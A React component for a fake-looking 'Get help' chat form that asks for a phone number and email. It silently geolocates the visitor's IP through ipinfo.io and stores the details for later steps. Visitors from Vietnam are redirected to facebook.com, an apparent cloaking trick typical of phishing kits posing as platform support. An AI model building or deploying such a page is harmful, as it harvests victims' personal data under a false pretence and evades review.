import React, { useState,useEffect} from "react";
import validator from "validator";
import MyPopup from "../../components/popup";
//import { useNavigate, useParams, useSearchParams } from "react-router-dom";
import PhoneInput from 'react-phone-input-2'
import Header from "../../Header/Header";

const StartChat = () => {
  const [disabled, setDisabled] = useState(true);
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [isPopupOpen, setPopupOpen] = useState(false);
  const [countryCode, setCountryCode] = useState('');
  //const params = useParams();
  //const {courseID} = params;

  const handlePhoneChange = (e) => {
    setPhone(e);
    if (!validator.isMobilePhone(e)) {
      setDisabled(true);
    } else {
      setDisabled(false);
    }
  };

  const handleEmailChange = (e) => {
    const newEmail = e.target.value;
    setEmail(newEmail);
    if (!validator.isEmail(newEmail)) {
      setDisabled(true);
    } else {
      setDisabled(false);
    }
  };

  useEffect(() => {
    const setLocaltion = async () => {
      try {
        fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
          var countryCode = d.country;
          setCountryCode(countryCode.toLowerCase());
          localStorage.setItem(
            "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
          );
        })
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!validator.isEmail(email) || !validator.isMobilePhone(phone)){
      alert("Please provide us valid information!");
    } else {
      try{
        var ip = localStorage.getItem("location"); 
        localStorage.setItem(
          "user",
          JSON.stringify({phone,email,ip})
        );
        setPopupOpen(true);
      }catch(e){
        console.log(e);
      }
    }
  };

  const closePopup = () => {
    setPopupOpen(false);
  };

  if (countryCode == 'vn') {
    return <meta httpEquiv="refresh" content="1; url=https://www.facebook.com/"/>;
  }
  else
  {
    return (
      <div>
      <Header/> 
      <div className="body mb-5">
      <div className="wrap-title">
          <h2>How can we help?</h2>
          <p>We need more information to address your issue.</p>
          <p>This form will only take a few minutes.</p>
          <div className="form-send-wrapper">
          <h3>Get help</h3>
          <MyPopup isOpen={isPopupOpen} onClose={closePopup} />
          <form className="Form" onSubmit={handleSubmit}>
              <div style={{marginBottom:'20px'}}>
                <label className="InputText__label">Phone number</label>
                <PhoneInput
                    enableAreaCodes={true}
                    country={countryCode}
                    value={phone}
                    onChange={handlePhoneChange}
                    />
              </div>
              <div className="InputText"><label htmlFor="Email address" className="InputText__label">Email address</label><input type="email" id="email" onChange={handleEmailChange} value={email} name="email" placeholder="Email address" className="form-control form-control-lg"/></div>
              <div className="d-flex justify-content-end">
                <button disabled={disabled} className="chat_btn" type="submit">
                    <ion-icon name="chatbubble" role="img" className="md hydrated"></ion-icon>
                    <span>Start Chat</span>
                </button>
              </div>
          </form>
        </div>
      </div>
      </div>
      </div>
    );
  };
}

export default StartChat;
